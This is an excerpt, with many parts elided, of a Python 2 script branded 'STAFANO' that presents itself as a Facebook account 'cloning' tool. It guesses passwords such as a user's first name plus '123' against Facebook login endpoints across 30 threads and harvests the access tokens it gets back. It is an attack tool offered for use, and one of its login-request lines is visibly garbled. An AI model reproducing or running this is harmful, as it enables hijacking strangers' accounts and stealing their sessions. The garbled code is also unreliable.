...
\033[1;98m   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝    
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ Create TOOL ANO|BABY                       ║    
\033[1;98m    ║✯ DISCORD STAF ANO                           ║  
\033[1;96m    ║✯ SUPPORT TOOL EMPRATOR AND ANO              ║
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
print  """
\033[1;97m**************************************
\033[1;96m~ WELCOME TO TOOL STAFANO  ~
\033[1;97m**************************************
\033[1;95m ███████ ████████  █████  ███████ 
\033[1;95m ██         ██    ██   ██ ██    
\033[1;95m ███████    ██    ███████ █████
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://discord.gg/w52ZkmJ3Wz')
    else:
...
def pilih():
	...
	if unikers =="":
		...
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBABY \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mSTAFANO\033[1;97m•◈•══════•◈•"
		...
		print "\033[1;92m•◈•══════••◈•\033[1;91mSTAFANO\033[1;95m•◈•══════••◈•"
		try:
	...
	jalan('           \033[1;91mSTAFANO start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
				...
				oks.append(user+pass1)
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
					       ...
					       data = urllib.urlopen("https://www.facebook.com/shwan.hassan.963"+(shwan.hassan)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mSTAFANO\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By BABY--•◈•---»" #Dev:BABY
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 stafano.py)↩\033[1;97m....'
